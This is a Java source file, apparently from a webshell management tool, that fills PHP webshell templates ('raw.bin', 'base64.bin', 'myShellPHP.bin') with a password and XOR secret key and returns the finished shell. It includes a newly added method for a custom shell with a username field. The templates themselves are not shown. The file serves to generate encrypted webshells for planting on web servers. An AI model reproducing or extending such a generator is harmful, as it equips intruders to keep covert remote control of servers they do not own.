package shells.cryptions.phpXor;

import java.io.InputStream;
import java.util.Base64;

import util.Log;
import util.TemplateEx;
import util.functions;

class Generate {
   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
      byte[] data = null;

      try {
         InputStream inputStream = Generate.class.getResourceAsStream("/shells/cryptions/phpXor/template/" + (isBin ? "raw.bin" : "base64.bin"));
         String code = new String(functions.readInputStream(inputStream));
         inputStream.close();
         code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
         code = TemplateEx.run(code);
         data = code.getBytes();
      } catch (Exception var6) {
         Log.error((Throwable)var6);
      }

      return data;
   }

   //新增生成方法
   public static byte[] GenerateMyPHPShell(String user,String pass, String secretKey){
      byte[] data =null;
      try{
        InputStream inputStream= Generate.class.getResourceAsStream("/shells/cryptions/phpXor/template/myShellPHP.bin");
         String code=new String(functions.readInputStream(inputStream));
         if (inputStream == null) {
            Log.error("myShellPHP.bin 资源未找到，请检查路径和资源文件是否存在！");
            return null;
         }
         inputStream.close();
          System.out.println(code);
         code=code.replace("{user}",user).replace("{pass}",pass).replace("{key}",secretKey);
         code=TemplateEx.run(code);
         data=code.getBytes();
      }
      catch (Exception e){
         Log.error(e.getMessage());
      }
      return data;
   }
   public static void main(String[] args) {
      System.out.println(new String(GenerateShellLoder("123", "456", false)));
   }
}
